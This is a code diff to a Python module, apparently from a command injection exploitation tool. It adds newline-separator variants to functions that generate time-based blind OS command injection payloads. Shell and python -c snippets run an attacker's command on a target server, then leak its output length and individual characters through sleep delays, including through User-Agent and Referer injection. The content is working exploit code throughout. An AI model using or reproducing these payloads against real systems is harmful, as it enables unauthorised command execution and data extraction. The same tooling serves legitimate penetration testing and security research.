@@ -35,7 +35,19 @@ def decision(separator, TAG, output_length, delay, http_request_method):
                "else sleep " + str(delay) + separator + " "
                "fi "
                )
-    
+
+  elif separator == "%0a" :
+    separator = "\n"
+    payload = (separator + " "
+               "str=$(echo "+TAG+")" + separator + " "
+               # Find the length of the output.
+               "str1=${#str}" + separator + " "
+               "if [ " + str(output_length) + " -ne ${str1} ]" + separator  + " "
+               "then sleep 0" + separator + " "
+               "else sleep " + str(delay) + separator + " "
+               "fi "
+               )
+
   elif separator == "&&" :
     if http_request_method == "POST":
       separator = urllib.quote(separator)
@@ -43,7 +55,7 @@ def decision(separator, TAG, output_length, delay, http_request_method):
     else:
       ampersand = "&"
     payload = (ampersand + " " +
-               "sleep 0  " + separator + " "
+               "sleep 0 " + separator + " "
                "str=$(echo "+TAG+") " + separator + " "
                # Find the length of the output.
                "str1=${#str} " + separator + " "
@@ -69,6 +81,17 @@ __Warning__: The alternative shells are still experimental.
 def decision_alter_shell(separator, TAG, output_length, delay, http_request_method):
 
   if separator == ";" :
+    payload = (separator + " "
+               # Find the length of the output, using readline().
+               "str1=$(python -c \"print len(\'" + TAG + "\')\")"+ separator + " "
+               "if [ " + str(output_length) + " -ne ${str1} ]" + separator  + " "
+               "then $(python -c \"import time\ntime.sleep(0)\")"+ separator + " "
+               "else $(python -c \"import time\ntime.sleep("+ str(delay) +")\")"+ separator + " "
+               "fi "
+               )
+
+  elif separator == "%0a" :
+    separator = "\n"
     payload = (separator + " "
                # Find the length of the output, using readline().
                "str1=$(python -c \"print len(\'" + TAG + "\')\")"+ separator + " "
@@ -105,7 +128,7 @@ def decision_alter_shell(separator, TAG, output_length, delay, http_request_meth
 
   # New line fixation
   if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True:
-    payload = payload.replace("\n","%0d")
+    payload = payload.replace("\n",";")
 
   return payload
 
@@ -122,15 +145,26 @@ def cmd_execution(separator, cmd, output_length, delay, http_request_method):
                "else sleep " + str(delay) + separator + " "
                "fi "
                )
-               
-  if separator == "&&" :
+
+  elif separator == "%0a" :
+    separator = "\n"
+    payload = (separator + " "
+               "str=$(" + cmd + ")" + separator + " "
+               "str1=${#str}" + separator + " "
+               "if [ " + str(output_length) + " != ${str1} ]" + separator + " "
+               "then sleep 0" + separator + " "
+               "else sleep " + str(delay) + separator + " "
+               "fi "
+               )
+
+  elif separator == "&&" :
     if http_request_method == "POST":
       separator = urllib.quote(separator)
       ampersand = urllib.quote("&")
     else:
       ampersand = "&"
     payload = (ampersand + " " +
-               "sleep 0  " + separator + " "
+               "sleep 0 " + separator + " "
                "str=$(" + cmd + ")  " + separator + " "
                # Find the length of the output.
                "str1=${#str}  " + separator + " "
@@ -140,11 +174,14 @@ def cmd_execution(separator, cmd, output_length, delay, http_request_method):
     if http_request_method == "POST":
       separator = urllib.unquote(separator)
       
-  if separator == "||" :
+  elif separator == "||" :
     payload = ("| " +
                "[ "+str(output_length)+" -ne $(echo -n $(" + cmd + ") | tr -d '\\n' | wc -c) ] " + separator + " " 
                "sleep " + str(delay) + " "
                )
+  else:
+    pass
+
   return payload
 
 """
@@ -153,6 +190,17 @@ __Warning__: The alternative shells are still experimental.
 def cmd_execution_alter_shell(separator, cmd, output_length, delay, http_request_method):
 
   if separator == ";" :
+    payload = (separator + " "
+               # Find the length of the output, using readline().
+               "str1=$(python -c \"print len(\'$(echo $("+cmd+"))\')\")"+ separator + " "
+               "if [ " + str(output_length) + " -ne ${str1} ]" + separator  + " "
+               "then $(python -c \"import time\ntime.sleep(0)\")"+ separator + " "
+               "else $(python -c \"import time\ntime.sleep("+ str(delay) +")\")"+ separator + " "
+               "fi "
+               )
+
+  elif separator == "%0a" :
+    separator = "\n"
     payload = (separator + " "
                # Find the length of the output, using readline().
                "str1=$(python -c \"print len(\'$(echo $("+cmd+"))\')\")"+ separator + " "
@@ -189,7 +237,7 @@ def cmd_execution_alter_shell(separator, cmd, output_length, delay, http_request
 
   # New line fixation
   if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True:
-    payload = payload.replace("\n","%0d")
+    payload = payload.replace("\n",";")
 
   return payload
 
@@ -207,14 +255,24 @@ def get_char(separator, cmd, num_of_chars, ascii_char, delay, http_request_metho
                "fi "
                )
 
-  if separator == "&&" :
+  elif separator == "%0a" :
+    separator = "\n"
+    payload = (separator + " "
+               "str=$(" + cmd + "|tr '\\n' ' '|cut -c " + str(num_of_chars) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2)" + separator +
+               "if [ " + str(ascii_char) + " != ${str} ]" + separator +
+               "then sleep 0" + separator +
+               "else sleep " + str(delay) + separator +
+               "fi "
+               )
+
+  elif separator == "&&" :
     if http_request_method == "POST":
       separator = urllib.quote(separator)
       ampersand = urllib.quote("&")
     else:
       ampersand = "&"
     payload = (ampersand + " " +
-               "sleep 0  " + separator + " "
+               "sleep 0 " + separator + " "
                "str=$(" + cmd + "|tr '\\n' ' '|cut -c " + str(num_of_chars) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2) " + separator + " "
                "[ " + str(ascii_char) + " -eq ${str} ] " + separator + " "
                "sleep " + str(delay) + " "
@@ -222,12 +280,13 @@ def get_char(separator, cmd, num_of_chars, ascii_char, delay, http_request_metho
     if http_request_method == "POST":
       separator = urllib.unquote(separator)
 
-  if separator == "||" :
+  elif separator == "||" :
     payload = ("| "
                "[ " + str(ascii_char) + " -ne  $(" + cmd + "|tr '\\n' ' '|cut -c " + str(num_of_chars) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2) ] " + separator + 
                "sleep " + str(delay) + " "
-               )	
-    
+               )  
+  else:
+    pass
   return payload
 
 """
@@ -243,7 +302,17 @@ def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, delay, http_r
                "else $(python -c \"import time\ntime.sleep("+ str(delay) +")\")"+ separator + " "
                "fi "
                )
-    
+
+  elif separator == "%0a" :
+    separator = "\n"
+    payload = (separator + " "
+               "str=$(python -c \"print ord(\'$(echo $("+cmd+"))\'["+str(num_of_chars-1)+":"+str(num_of_chars)+"])\nexit(0)\")" + separator +
+               "if [ " + str(ascii_char) + " != ${str} ]" + separator +
+               "then $(python -c \"import time\ntime.sleep(0)\")"+ separator + " "
+               "else $(python -c \"import time\ntime.sleep("+ str(delay) +")\")"+ separator + " "
+               "fi "
+               )
+
   elif separator == "&&" :
     if http_request_method == "POST":
       separator = urllib.quote(separator)
@@ -270,7 +339,7 @@ def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, delay, http_r
 
   # New line fixation
   if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True:
-    payload = payload.replace("\n","%0d")
+    payload = payload.replace("\n",";")
 
   return payload
   
@@ -287,14 +356,24 @@ def fp_result(separator, cmd, num_of_chars, ascii_char, delay, http_request_meth
                "fi "
                )
 
-  if separator == "&&" :
+  elif separator == "%0a" :
+    separator = "\n"
+    payload = (separator + " "
+               "str=$(" + cmd + ")" + separator + " "
+               "if [ " + str(ascii_char) + " != ${str} ]" + separator + " "
+               "then sleep 0" + separator + " "
+               "else sleep " + str(delay) + separator + " "
+               "fi "
+               )
+
+  elif separator == "&&" :
     if http_request_method == "POST":
       separator = urllib.quote(separator)
       ampersand = urllib.quote("&")
     else:
       ampersand = "&"
     payload = (ampersand + " " +
-               "sleep 0  " + separator + " "
+               "sleep 0 " + separator + " "
                "str=$(" + cmd + ") " + separator + " "
                "[ " + str(ascii_char) + " -eq ${str} ] " + separator + " "
                "sleep " + str(delay) + " "
@@ -302,12 +381,15 @@ def fp_result(separator, cmd, num_of_chars, ascii_char, delay, http_request_meth
     if http_request_method == "POST":
       separator = urllib.unquote(separator)
 
-  if separator == "||" :
+  elif separator == "||" :
     payload = ("| " +
                "[ " + str(ascii_char) + " -ne  $(" + cmd + ") ] " + separator + 
                "sleep " + str(delay) + " "
                )  
-    
+
+  else:
+    pass
+
   return payload
 
 """
@@ -316,6 +398,16 @@ __Warning__: The alternative shells are still experimental.
 def fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, delay, http_request_method):
   
   if separator == ";" :
+    payload = (separator + " "
+               "str=$(python -c \"print $(echo $("+cmd+"))\n\")" + separator +
+               "if [ " + str(ascii_char) + " != ${str} ]" + separator +
+               "then $(python -c \"import time\ntime.sleep(0)\")"+ separator + " "
+               "else $(python -c \"import time\ntime.sleep("+ str(delay) +")\")"+ separator + " "
+               "fi "
+               )
+
+  elif separator == "%0a" :
+    separator = "\n"
     payload = (separator + " "
                "str=$(python -c \"print $(echo $("+cmd+"))\n\")" + separator +
                "if [ " + str(ascii_char) + " != ${str} ]" + separator +
@@ -350,6 +442,6 @@ def fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, delay, http_
 
   # New line fixation
   if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True:
-    payload = payload.replace("\n","%0d")
+    payload = payload.replace("\n",";")
 
   return payload
